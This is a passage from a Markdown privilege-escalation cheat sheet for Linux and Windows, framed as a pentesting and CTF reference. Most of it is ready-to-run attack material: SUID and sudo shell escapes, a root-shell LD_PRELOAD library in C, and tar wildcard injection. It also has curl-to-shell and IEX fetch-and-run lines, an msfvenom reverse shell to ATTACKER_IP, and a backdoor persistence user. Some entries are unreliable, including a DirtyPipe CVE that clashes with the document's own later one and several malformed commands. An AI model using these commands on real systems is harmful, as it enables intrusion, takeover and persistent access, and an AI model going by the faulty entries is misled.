| `route` | Routing table (legacy) |
| `route -n` | Routing table (numeric, no DNS resolution) |
| `arp -a` | ARP cache (shows other hosts on the same network) |
| `ip neigh` | ARP cache (modern) |
| `netstat -tulpn` | Listening ports and connections (legacy) |
| `ss -tulpn` | Listening ports and connections (modern, faster) |
| `netstat -ano` | All connections with PIDs |
| `ss -anop` | All connections with PIDs (modern) |
| `netstat -i` | Network interface statistics |
| `ss -i` | TCP socket internal information |
| `iptables -L` | Firewall rules (requires root) |
| `iptables -L -n` | Firewall rules (numeric, no DNS) |
| `nft list ruleset` | nftables rules (modern firewall) |
| `cat /etc/hosts` | Static host mappings |
| `cat /etc/resolv.conf` | DNS configuration |
| `cat /etc/hostname` | System hostname (file) |
| `cat /etc/network/interfaces` | Network configuration (Debian/Ubuntu legacy) |
| `ls /etc/sysconfig/network-scripts/` | Network configuration (RHEL/CentOS) |
| `nmcli device status` | NetworkManager device status |
| `nmcli connection show` | NetworkManager connections |
| `traceroute 8.8.8.8` | Trace route to external IP |
| `tracepath 8.8.8.8` | Trace route (no root required) |
| `ping -c 4 8.8.8.8` | Test connectivity to external host |
| `dig google.com` | DNS lookup (requires dig) |
| `nslookup google.com` | DNS lookup |
| `host google.com` | DNS lookup |
| `cat /var/lib/dhcp/dhclient.leases` | DHCP lease history (may contain hostnames) |
| `cat /etc/netplan/*.yaml` | Netplan configuration (Ubuntu modern) |

[🔝 Back to Top](#top)

### 20. Linux SUID/SGID Binaries

| Command | Purpose |
|---------|---------|
| `find / -perm -4000 -type f 2>/dev/null` | Find SUID binaries (setuid) |
| `find / -perm -2000 -type f 2>/dev/null` | Find SGID binaries (setgid) |
| `find / -perm -4000 -o -perm -2000 -type f 2>/dev/null` | Find SUID and SGID binaries |
| `find / -uid 0 -perm -4000 -type f 2>/dev/null` | Find SUID binaries owned by root |
| `find / -perm -u=s -type f 2>/dev/null` | Alternative SUID search |
| `find / -perm -g=s -type f 2>/dev/null` | Alternative SGID search |
| `find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null` | Find SUID binaries with details |
| `find / -perm -4000 -type f -exec file {} \; 2>/dev/null` | Find SUID binaries with file type info |

- **Common SUID binaries to check for known exploits:**

| Binary | Exploit/Vulnerability |
|--------|----------------------|
| `pkexec` | CVE-2021-4034 (PwnKit) |
| `sudo` | Check `sudo -l`, CVE-2019-14287, CVE-2021-3156 |
| `su` | Standard su, often requires password |
| `passwd` | Password change, not directly exploitable |
| `mount`, `umount` | May have known vulnerabilities |
| `chsh`, `chfn` | Change shell/finger info |
| `gpasswd` | Group password management |
| `newgrp` | Change group context |
| `at` | Job scheduling (check `/etc/at.allow`, `/etc/at.deny`) |
| `crontab` | Cron job management (check user's cron) |
| `find` | `find / -exec /bin/sh \; -quit` |
| `bash` | `bash -p` (preserve privileges) |
| `less` | `less /etc/passwd`, then `!sh` |
| `more` | `more /etc/passwd`, then `!sh` |
| `vim` | `vim -c ':!/bin/sh'` |
| `nano` | `nano`, then `^R^X`, then `reset; sh 1>&0 2>&0` |
| `cp` | Can copy protected files |
| `mv` | Can move protected files |
| `chmod` | Can change permissions on protected files |
| `tee` | `echo "user:pass" \| sudo tee -a /etc/passwd` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
| `perl` | `perl -e 'exec "/bin/sh";'` |
| `python` | `python -c 'import pty;pty.spawn("/bin/sh")'` |
| `ruby` | `ruby -e 'exec "/bin/sh"'` |
| `openssl` | Can be used for file encryption (not directly for shell) |


[🔝 Back to Top](#top)

### 21. Linux Sudo Misconfigurations

| Command | Purpose |
|---------|---------|
| `sudo -l` | List current user's sudo permissions |
| `sudo -ll` | List sudo permissions (detailed) |
| `sudo -l -U username` | List sudo permissions for another user (requires sudo) |
| `cat /etc/sudoers` | View sudoers file (requires root) |
| `cat /etc/sudoers.d/*` | View sudoers includes (requires root) |
| `visudo -c` | Check sudoers file for syntax errors (requires root) |

- **Common sudo misconfigurations and how to exploit them:**

| `sudo -l` Entry | Exploit Command |
|-----------------|-----------------|
| `(ALL) NOPASSWD: ALL` | `sudo su` or `sudo -i` |
| `(ALL) NOPASSWD: /bin/bash` | `sudo /bin/bash` |
| `(ALL) NOPASSWD: /bin/sh` | `sudo /bin/sh` |
| `(ALL) NOPASSWD: /usr/bin/vim` | `sudo vim -c '!sh'` |
| `(ALL) NOPASSWD: /usr/bin/nano` | `sudo nano`, then `^R^X`, then `reset; sh 1>&0 2>&0` |
| `(ALL) NOPASSWD: /usr/bin/less` | `sudo less`, then `!sh` |
| `(ALL) NOPASSWD: /usr/bin/more` | `sudo more`, then `!sh` |
| `(ALL) NOPASSWD: /usr/bin/awk` | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| `(ALL) NOPASSWD: /usr/bin/python*` | `sudo python -c 'import pty;pty.spawn("/bin/sh")'` |
| `(ALL) NOPASSWD: /usr/bin/perl` | `sudo perl -e 'exec "/bin/sh";'` |
| `(ALL) NOPASSWD: /usr/bin/ruby` | `sudo ruby -e 'exec "/bin/sh"'` |
| `(ALL) NOPASSWD: /usr/bin/gcc` | `sudo gcc -wrapper /bin/sh,-s` |
| `(ALL) NOPASSWD: /usr/bin/gdb` | `sudo gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh")' -ex quit` |
| `(ALL) NOPASSWD: /usr/bin/git` | `sudo git -p help config` (then `!sh`) |
| `(ALL) NOPASSWD: /usr/bin/zip` | Create a zip with symlink to /etc/passwd, then extract |
| `(ALL) NOPASSWD: /usr/bin/tar` | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `(ALL) NOPASSWD: /usr/bin/find` | `sudo find / -exec /bin/sh \; -quit` |
| `(ALL) NOPASSWD: /bin/systemctl` | `sudo systemctl exec systemd-journald /bin/sh` (advanced) |
| `(ALL) NOPASSWD: /usr/bin/apt` | `sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh` |
| `(ALL) NOPASSWD: /usr/bin/apt-get` | `sudo apt-get changelog apt` (then `!/bin/sh`) |
| `(ALL) NOPASSWD: /usr/bin/dpkg` | `sudo dpkg --post-invoke=/bin/sh` |
| `(ALL) NOPASSWD: /usr/bin/rsync` | `sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null` |
| `(ALL) NOPASSWD: /usr/bin/env` | `sudo env /bin/sh` |
| `(ALL) NOPASSWD: /bin/systemctl` | `sudo systemctl set-environment LD_PRELOAD=/tmp/evil.so` (then start a service) |

[🔝 Back to Top](#top)

### 22. Linux Cron Jobs

| Command | Purpose |
|---------|---------|
| `cat /etc/crontab` | System-wide cron table |
| `cat /etc/cron.d/*` | Cron.d entries (individual job files) |
| `cat /etc/cron.daily/*` | Daily cron scripts |
| `cat /etc/cron.hourly/*` | Hourly cron scripts |
| `cat /etc/cron.weekly/*` | Weekly cron scripts |
| `cat /etc/cron.monthly/*` | Monthly cron scripts |
| `crontab -l` | Current user's crontab |
| `crontab -l -u username` | Specific user's crontab (requires root) |
| `ls -la /var/spool/cron/crontabs` | User crontab files |
| `ls -la /var/spool/cron/` | User crontab files (location varies by distro) |
| `find /etc/cron* -type f -name "*" -exec ls -la {} \; 2>/dev/null` | Find all cron files with permissions |
| `find /etc/cron* -type f -name "*" -exec cat {} \; 2>/dev/null` | View all cron files content |
| `systemctl list-timers` | Systemd timers (modern cron alternative) |
| `systemctl list-timers --all` | All systemd timers (including inactive) |

- **What to look for in cron jobs:**
  - Writable cron scripts (check if you can modify them)
  - Scripts in writable directories
  - Commands that use wildcards (potential wildcard injection)
  - Paths with spaces (potential unquoted path issues)
  - Environment variables set in the crontab

[🔝 Back to Top](#top)

### 23. Linux Writable Files

| Command | Purpose |
|---------|---------|
| `find / -writable -type d 2>/dev/null` | Find writable directories |
| `find / -writable -type f 2>/dev/null` | Find writable files |
| `find / -perm -2 -type d 2>/dev/null` | World-writable directories |
| `find / -perm -2 -type f 2>/dev/null` | World-writable files |
| `find / -perm -2 -type d -ls 2>/dev/null` | World-writable directories with details |
| `find / -nouser -o -nogroup 2>/dev/null` | Files with no owner or no group |
| `ls -la /etc/passwd` | Check if /etc/passwd is writable |
| `ls -la /etc/shadow` | Check if /etc/shadow is writable |
| `ls -la /etc/sudoers` | Check if /etc/sudoers is writable |
| `ls -la /etc/sudoers.d/` | Check sudoers include directory |
| `find / -type f \( -perm -2 -o -perm -20 \) -exec ls -la {} \; 2>/dev/null` | Find world-writable files (verbose) |
| `find / -writable ! -user \`whoami\` -type f 2>/dev/null` | Find writable files not owned by current user |

- **High-value writable targets:**
  - `/etc/passwd` - if writable, you can add a root user
  - `/etc/shadow` - if writable, you can change root password hash
  - `/etc/sudoers` - if writable, you can add sudo permissions
  - `/etc/crontab` - if writable, you can add a cron job
  - `.bashrc` / `.profile` - user's shell configuration files
  - `/etc/ld.so.conf` - library configuration
  - `/etc/ld.so.preload` - library preloading

[🔝 Back to Top](#top)

### 24. Linux Kernel Exploits

| Command | Purpose |
|---------|---------|
| `uname -a` | Get kernel version |
| `uname -r` | Kernel release only |
| `cat /proc/version` | Kernel version and compiler info |
| `lsmod` | Loaded kernel modules |
| `modinfo MODULE_NAME` | Information about a specific module |
| `find /lib/modules -name "*.ko" -type f 2>/dev/null` | Available modules |
| `find /lib/modules/$(uname -r) -name "*.ko" -type f` | Available modules for current kernel |
| `cat /proc/sys/kernel/version` | Kernel version (alternative) |
| `cat /proc/cpuinfo \| grep -E "model name\|flags"` | CPU information (check for Meltdown/Spectre) |

- **Common Linux kernel vulnerabilities (historical reference):**

| CVE | Name | Affected Kernels |
|-----|------|------------------|
| CVE-2016-5195 | DirtyCow | 2.6.22 - 4.8.3 (almost all before 2016) |
| CVE-2017-1000112 | DirtyPipe | 5.8 - 5.16.11 |
| CVE-2021-3493 | OverlayFS | Ubuntu kernels before 5.11 |
| CVE-2019-13272 | ptrace | Kernels before 5.1 |
| CVE-2017-6074 | DCCP double free | Kernels before 4.9 |
| CVE-2021-3156 | Baron Samedit (sudo) | sudo versions 1.8.2 - 1.8.31p2 |
| CVE-2017-1000367 | Stack Clash | Various kernels |
| CVE-2017-1000253 | PIE stack corruption | Kernels before 4.14 |

- **Tools for kernel exploit discovery:**
  - `linux-exploit-suggester`: `curl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh \| sh`
  - `linux-exploit-suggester-2`: `curl -L https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl \| perl`
  - `LES.sh`: Look for Linux privilege escalation scripts

[🔝 Back to Top](#top)

### 25. Linux Docker Breakout

| Command | Purpose |
|---------|---------|
| `ls -la /.dockerenv` | Check if inside container (file exists) |
| `cat /proc/1/cgroup \| grep -i docker` | Check cgroup for docker (alternative) |
| `find / -name "*docker*" 2>/dev/null` | Find Docker-related files |
| `docker info` | Docker info (if you have docker command) |
| `docker images` | List Docker images (if you have docker command) |
| `docker ps` | List running containers (if you have docker command) |
| `docker run -it -v /:/host alpine chroot /host /bin/bash` | Escape using mounted host filesystem |
| `mount` | Check mounted filesystems |
| `cat /proc/mounts` | Raw mounted filesystems |
| `fdisk -l` | List disks (may show host disks) |
| `find / -name /var/run/docker.sock 2>/dev/null` | Check for Docker socket |
| `capsh --print` | Show current capabilities |
| `cat /proc/self/status \| grep Cap` | Show current capabilities (hex) |
| `find / -perm -4000 -type f 2>/dev/null` | Look for SUID binaries inside container |

- **Common Docker escape techniques:**
  - Mounted Docker socket (`/var/run/docker.sock`) - can run commands on host
  - Privileged container (`--privileged`) - can access host devices
  - Mounted host filesystems - can write to host files
  - CVE-2019-5736 (runc breakout) - overwrite runc binary
  - `--cap-add=SYS_ADMIN` with mounted host filesystem

[🔝 Back to Top](#top)

### 26. Linux PATH Manipulation

| Command | Purpose |
|---------|---------|
| `echo $PATH` | Show current PATH |
| `find / -writable -type d 2>/dev/null` | Find writable directories |
| `find / -writable -type d 2>/dev/null \| grep -v proc` | Find writable directories (exclude /proc) |
| `find / -writable -type d -exec ls -ld {} \; 2>/dev/null` | Find writable directories with permissions |
| `which COMMAND` | Show where a command is located |
| `type COMMAND` | Show command type (builtin, alias, file) |
| `export PATH=/tmp:$PATH` | Add /tmp to beginning of PATH (for current session) |
| `export PATH=$PATH:/tmp` | Add /tmp to end of PATH (less likely to be used) |

- **Attack: Create malicious binary in writable PATH directory**

```bash
* If a writable directory is in PATH
echo '#!/bin/bash' > /tmp/ls
echo '/bin/bash' >> /tmp/ls
chmod +x /tmp/ls

* Wait for a privileged user to execute 'ls'
```

---

[🔝 Back to Top](#top)

### 27. Linux Wildcard Injection

|Command| Purpose|
|----|----|
|`cd /tmp && touch -- '--help'`| Create file named `--help`|
|`cd /tmp && touch -- '--version'`| Create file named `--version`|
|`cd /tmp && touch -- '--preserve-status'`| Create file named `--preserve-status`|
|`cd /tmp && touch -- '--reverse'`| Create file named `--reverse`|
|`cd /tmp && touch -- '--checkpoint=1'`| Create file for tar exploitation|
|`cd /tmp && touch -- '--checkpoint-action=exec=sh shell.sh'`| Create file for tar exploitation|
|`cd /tmp && echo '#!/bin/bash' > shell.sh`| Create malicious script|
|`cd /tmp && echo 'chmod 777 /etc/shadow' >> shell.sh`| Malicious payload|
|`cd /tmp && chmod +x shell.sh`| Make executable|

- **Attack scenarios for wildcard injection:**

|Command with Wildcard| Exploit Method|
|----|------|
|`chown root *`| Create file named `--help` (chown interprets as argument)|
|`chmod 777 *`| Create file named `--help`|
|`tar -czf backup.tar.gz *`| Create files named `--checkpoint=1 and --checkpoint-action=exec=sh shell.sh`|
|`rsync -a * /backup/`| Similar to tar, can execute commands|
|`rm *`| Create file named `-rf` (then `rm *` becomes rm `-rf`)|

Example of tar wildcard injection:

```bash
cd /tmp
echo '#!/bin/bash' > shell.sh
echo 'chmod 777 /etc/shadow' >> shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'

```
-  When tar runs with *, it executes the malicious command

---

[🔝 Back to Top](#top)

### 28. Linux Shared Library Hijacking

|Command| Purpose|
|----|-----|
|`ldd /path/to/binary`| Show libraries a binary uses|
|`ldd /path/to/binary \| grep "not found"`| Find missing libraries|
|`cat /etc/ld.so.conf`| Library search paths|
|`cat /etc/ld.so.conf.d/*`| Additional library paths|
|`echo $LD_LIBRARY_PATH`| User-defined library path|
|`find / -name "*.so" -writable -type f 2>/dev/null`| Find writable libraries|
|`find / -name "*.so" -writable -type f -exec ls -la {} \; 2>/dev/null`| Detailed writable library info|
|`find / -name "*.so.*" -writable -type f 2>/dev/null`| Find writable shared libraries with versions|
|`ldconfig -p`| List cached libraries and paths|

- **Attack scenarios for library hijacking:**

  - 1. Writable library in search path:
  
    · Find a library that a SUID binary loads
    · Replace it with a malicious library
    · Run the SUID binary to execute your code as root

  - 2. LD_PRELOAD (if allowed):
    
    ```bash
    gcc -shared -fPIC -o evil.so evil.c -ldl
    LD_PRELOAD=./evil.so /path/to/suid/binary
    ```

  - 3. LD_LIBRARY_PATH (if allowed):

    ```bash
    export LD_LIBRARY_PATH=/tmp
    /path/to/suid/binary
    ```

- **Sample malicious library code (evil.c):**

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

---

[🔝 Back to Top](#top)

### 29. Linux Capabilities

|Command| Purpose|
|------|------|
|`capsh --print`| Show current capabilities|
|`getcap -r / 2>/dev/null`| List all files with capabilities|
|`getcap /path/to/binary`| Check capabilities of a specific binary|
|`setcap cap_net_raw+ep /path/to/binary`| Add capability to a binary (requires root)|
|`setcap -r /path/to/binary`| Remove capabilities from a binary (requires root)|

- **Common dangerous capabilities:**

|Capability| What It Allows |Example Binary|
|-----|-----|-----|
|`cap_dac_override`| Bypass file read/write/execute permission checks |Any file access|
|`cap_dac_read_search`| Bypass file read permission and directory read/execute |Read any file|
|`cap_sys_admin`| Perform system administration tasks (mount, etc.) |Mount, chroot|
|`cap_sys_ptrace`| Trace arbitrary processes| Debug processes, inject code|
|`cap_sys_module `|Load and unload kernel modules |Load rootkit|
|`cap_net_raw `|Use raw sockets, sniff traffic |Packet capture|
|`cap_setuid`| Arbitrary manipulation of process UIDs |Change to any user|
|`cap_setgid `|Arbitrary manipulation of process GIDs |Change to any group|
|`cap_chown`| Change file ownership| Change file owner|
|`cap_kill`| Send signals to processes owned by others |Kill any process|

- **Privilege escalation via capabilities:**

  - `cap_dac_override` on `tar` or `cp`: Can read any file
  - `cap_setuid` on `python: python -c 'import os; os.setuid(0); os.system("/bin/sh")'`
  - `cap_sys_ptrace` on `gdb`: Can attach to root processes
  - `cap_net_raw `on `tcpdump:` Can capture network traffic

---

[🔝 Back to Top](#top)

### 30. Linux Environment Variables

|Command| Purpose|
|-----|-----|
|`env`| Show all environment variables|
|`set`| Show all environment and shell variables|
|`printenv`| Print environment variables|
|`printenv PATH`| Show PATH variable|
|`echo $LD_PRELOAD`| Show LD_PRELOAD variable|
|`echo $LD_LIBRARY_PATH`| Show LD_LIBRARY_PATH variable|
|`echo $PATH`| Show PATH variable|
|`echo $HOME`| Show home directory|
|`echo $USER`| Show current username|
|`echo $SHELL`| Show current shell|
|`echo $TMPDIR`| Show temporary directory|
|`cat ~/.bashrc`| User's bash configuration|
|`cat ~/.profile`| User's profile script|
|`cat ~/.bash_profile`| User's bash profile (login shell)|
|`cat ~/.zshrc`| User's zsh configuration|
|`cat /etc/environment`|System-wide environment variables (systemd systems)|
|`cat /etc/profile`|System-wide profile script|
|`cat /etc/bash.bashrc`| System-wide bashrc (Debian/Ubuntu)|

- **Dangerous environment variable configurations:**

  - LD_PRELOAD pointing to a malicious library
  - LD_LIBRARY_PATH including writable directories
  - PATH including writable directories before legitimate paths
  - TMPDIR pointing to a writable directory (if used by SUID binaries)
  - PYTHONPATH pointing to malicious Python modules
  - PERL5LIB pointing to malicious Perl modules

- **Exploitation example (LD_PRELOAD with sudo):**

   - Create malicious library

```bash
cat << EOF > /tmp/evil.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init() {
    if (geteuid() == 0) {
        setuid(0);
        system("/bin/bash");
    }
}
EOF
gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c
```
  -  Run with LD_PRELOAD (if not filtered)

```bash
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/sudo
```

[🔝 Back to Top](#top)

---

## General

### 31. Tools

#### Linux Enumeration Scripts

| Tool | Command | Purpose |
|------|---------|---------|
| **LinPEAS** | `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \| sh` | Automated Linux enumeration |
| **LinEnum** | `curl -L https://github.com/rebootuser/LinEnum/raw/master/LinEnum.sh \| sh` | Linux enumeration script |
| **linux-exploit-suggester** | `curl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh \| sh` | Suggest kernel exploits |
| **Linux Smart Enumeration** | `curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh \| sh` | Smart enumeration with categories |
| **unix-privesc-check** | `curl -L https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/unix-privesc-check \| sh` | Unix privilege escalation check |

#### Windows Enumeration Scripts

| Tool | Command | Purpose |
|------|---------|---------|
| **WinPEAS** | `Invoke-WebRequest https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.exe -OutFile winPEAS.exe && ./winPEAS.exe` | Automated Windows enumeration |
| **WinPEAS (PowerShell)** | `IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1"); winPEAS` | PowerShell version |
| **PowerUp** | `IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"); Invoke-AllChecks` | PowerShell privilege escalation checks |
| **JAWS** | `Invoke-WebRequest https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1 -OutFile jaws.ps1; powershell -exec bypass -File jaws.ps1` | Just Another Windows Enumeration Script |
| **Seatbelt** | `Invoke-WebRequest https://github.com/GhostPack/Seatbelt/raw/master/Seatbelt.exe -OutFile Seatbelt.exe; ./Seatbelt.exe -group=all` | C# enumeration tool |
| **SharpUp** | `Invoke-WebRequest https://github.com/GhostPack/SharpUp/raw/master/SharpUp.exe -OutFile SharpUp.exe; ./SharpUp.exe` | C# privilege escalation checks |
| **Watson** | `Invoke-WebRequest https://github.com/rasta-mouse/Watson/raw/master/Watson.exe -OutFile Watson.exe; ./Watson.exe` | Windows vulnerability finder |

#### Privilege Escalation Tools

| Tool | Purpose |
|------|---------|
| **pspy** | Monitor processes without root permissions |
| **pwnkit** | CVE-2021-4034 exploit |
| **dirtycow** | CVE-2016-5195 exploit |
| **dirtypipe** | CVE-2022-0847 exploit |
| **GTFOBins** | Website for SUID/sudo binary exploitation |
| **LOLBAS** | Website for Windows binaries exploitation |
| **Mimikatz** | Windows credential dumping |
| **Incognito** | Token manipulation |
| **JuicyPotato** | Windows privilege escalation via COM |

[🔝 Back to Top](#top)

### 32. Transferring Files

#### Linux to Linux

| Method | Command (Listener) | Command (Sender) |
|--------|-------------------|------------------|
| **Python HTTP server** | `python3 -m http.server 8000` (on attacker) | `wget http://ATTACKER_IP:8000/file` |
| **Python HTTP server (alt)** | `python3 -m http.server 8000` | `curl -O http://ATTACKER_IP:8000/file` |
| **SCP** | N/A | `scp file user@TARGET_IP:/path` |
| **Netcat** | `nc -lvnp 4444 > file` | `nc TARGET_IP 4444 < file` |
| **rsync** | `rsync -av --progress user@TARGET_IP:/path/file .` | `rsync -av --progress file user@TARGET_IP:/path` |
| **base64 encoding** | `echo "base64_string" \| base64 -d > file` | `base64 -w 0 file` (copy the string) |

#### Windows to Windows / Windows to Linux

| Method | Command |
|--------|---------|
| **PowerShell (Internet)** | `Invoke-WebRequest http://ATTACKER_IP:8000/file -OutFile file` |
| **PowerShell (Internet alt)** | `wget http://ATTACKER_IP:8000/file -OutFile file` |
| **PowerShell (WebClient)** | `(New-Object Net.WebClient).DownloadFile("http://ATTACKER_IP:8000/file", "file")` |
| **PowerShell (base64)** | Encode: `$b64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("file")); Write-Host $b64` (copy the string, then decode on Linux: `echo "base64_string" \| base64 -d > file`) |
| **certutil** | `certutil -urlcache -f http://ATTACKER_IP:8000/file file` |
| **bitsadmin** | `bitsadmin /transfer job /download /priority high http://ATTACKER_IP:8000/file C:\path\to\file` |
| **SCP (Windows with WinSCP)** | N/A |
| **Netcat (Windows with nc.exe)** | `nc.exe ATTACKER_IP 4444 > file` (listener: `nc -lvnp 4444 < file`) |
| **SMB** | `copy \\ATTACKER_IP\share\file file` (requires attacker SMB server) |

#### Linux to Windows

| Method | Command |
|--------|---------|
| **PowerShell (from Linux server)** | `Invoke-WebRequest http://ATTACKER_IP:8000/file -OutFile file` (same as above) |
| **Python HTTP server (on Linux)** | `python3 -m http.server 8000` (attacker) |
| **wget.exe (if installed)** | `wget http://ATTACKER_IP:8000/file -OutFile file` |

[🔝 Back to Top](#top)

### 33. Troubleshooting

| Problem | Likely Cause | Fix |
|---------|--------------|-----|
| **Linux: Command not found** | Tool not installed | Install the required package (`apt install` or `yum install`) |
| **Linux: Permission denied** | Need elevated privileges | Use `sudo` or switch to root |
| **Linux: `find / -writable` too slow** | Scanning entire filesystem | Limit to specific directories: `find /home /tmp /var -writable` |
| **Linux: `sudo -l` asks for password** | User requires password for sudo | Check if `NOPASSWD` is not set for your commands |
| **Linux: `ldd` shows "not found"** | Library missing | Install the required library or find alternative binary |
| **Linux: Capabilities not found** | `getcap` not installed | Install `libcap2-bin` package |
| **Linux: Container escape failed** | Container not privileged or socket not mounted | Check with `capsh --print` and `find / -name docker.sock` |
| **Windows: Command not recognized** | Not in PATH or not installed | Use full path or install the tool |
| **Windows: PowerShell script won't run** | Execution policy blocked | Run with `powershell -exec bypass` |
| **Windows: `net view` fails** | Not on domain or no permission | Use alternative tools (BloodHound, SharpHound, nltest) |
| **Windows: `wmic` not found** | Not available on this Windows version | Use PowerShell alternatives |
| **Windows: `accesschk.exe` not found** | Sysinternals tool not downloaded | Download from Microsoft website |
| **Cannot write to file** | Insufficient permissions | Check file ownership with `ls -la`, try to escalate privileges |
| **SUID binary doesn't give root** | The SUID binary is not owned by root or doesn't run with root privileges | Check with `ls -la` for ownership |
| **Cron job not executing** | Cron service not running or permissions issue | Check with `systemctl status cron` |

[🔝 Back to Top](#top)

### 34. Real-World Workflows

#### Workflow 1: Initial Linux Enumeration (Low Priv Shell)

- Step 1: Basic system info

```bash
whoami
id
uname -a
cat /etc/os-release
sudo -l 2>/dev/null
```
- Step 2: Find SUID/SGID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```
- Step 3: Check cron jobs

```bash
cat /etc/crontab 2>/dev/null
ls -la /etc/cron* 2>/dev/null
```
- Step 4: Check for writable files

```bash
find / -writable -type f 2>/dev/null | grep -v proc | head -20
```
- Step 5: Run automated enumeration

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

#### Workflow 2: Initial Windows Enumeration (Low Priv Shell)


- Step 1: Basic system info

```bash
whoami
whoami /priv
whoami /groups
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

- Step 2: User and group enumeration

```bash
net user
net localgroup Administrators
```

- Step 3: Service enumeration
```bash
sc query state= all | findstr SERVICE_NAME
wmic service get name,pathname,startname | findstr /i "LocalSystem"
```

- Step 4: Scheduled tasks
```bash
schtasks /query /fo LIST /v | findstr /i "task to run"
```

- Step 5: Run automated enumeration
```bash
powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"
```

#### Workflow 3: Linux Privilege Escalation via SUID Binary

- Step 1: Find SUID binaries
```bash
find / -perm -4000 -type f 2>/dev/null
```

- Step 2: Check if `find` has SUID
```bash
ls -la /usr/bin/find
```

- Step 3: Exploit `find` SUID
```bash
/usr/bin/find / -exec /bin/sh \; -quit
```

- Step 4: Verify root access
```bash
whoami
```

#### Workflow 4: Windows Privilege Escalation via Unquoted Service Path

- Step 1: Find services with unquoted paths
```bash
wmic service get name,pathname | findstr /i /v "C:\\Windows\\" | findstr /i "\" "
```

- Step 2: Check if you can write to the directory
```bash
dir C:\Program Files\My Service\
```

- Step 3: Compile and upload malicious service executable (on attacker machine) 
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o service.exe
```

- Step 4: Place malicious executable
```bash
copy service.exe "C:\Program Files\My Service\Service.exe"
```

- Step 5: Restart the service
```bash
sc stop SERVICE_NAME
sc start SERVICE_NAME
```

- Step 6: Get reverse shell as SYSTEM


#### Workflow 5: Full Linux Privilege Escalation Chain

- Phase 1: Initial foothold (low priv shell)
- Phase 2: Enumeration (manual + LinPEAS)
```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

- Phase 3: Identify vector (e.g., outdated kernel)
```bash
uname -r
```

- Phase 4: Download exploit from attacker machine
```bash
wget http://ATTACKER_IP:8000/exploit.sh
chmod +x exploit.sh
```

- Phase 5: Run exploit
```bash
./exploit.sh
```

- Phase 6: Verify root
```bash
whoami
id
```

- Phase 7: Persistence (add user)
```bash
useradd -m -s /bin/bash backdoor
echo "backdoor:password" | chpasswd
usermod -aG sudo backdoor
```

[🔝 Back to Top](#top)

---

## ✅ Completion Note

This document covers the essential privilege escalation commands for both Windows and Linux. Not every possible technique is included—but what's here is what you'll actually use in the field.

Each command was curated for clarity, accuracy, and practical use during CTFs, authorized penetration tests, and security assessments.

**Need a quick reminder?** → [📄 QUICKREF.md](QUICKREF.md) (one-page cheat sheet)  
**New to privesc?** → [📘 TUTORIAL.md](TUTORIAL.md) (beginner guide)  
**Want operational depth?** → [🧠 GUIDE.md](GUIDE.md) (strategy and detection)

This manual is complete. No AI wrote it. No copy-paste shortcuts. Every command was typed by hand and organized for quick reference.

**— Omar Fattah**

---


### License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.





















